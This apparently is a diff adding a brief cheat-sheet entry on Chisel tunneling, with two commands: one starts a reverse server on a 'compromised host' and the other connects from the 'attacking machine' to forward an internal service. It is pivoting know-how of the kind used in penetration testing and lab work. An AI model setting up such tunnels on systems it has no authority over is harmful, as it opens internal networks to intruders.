@@ -1,0 +1,12 @@
+Using Chisel for Tunneling:
+
+Command:
+On the compromised host:
+ 
+ 
+./chisel server -p 8000 --reverse
+On your attacking machine:
+ 
+ 
+./chisel client compromised_host_ip:8000 R:1080:internal_service_ip:80
+Description: Sets up a reverse proxy to tunnel traffic from an internal service to your local machine.
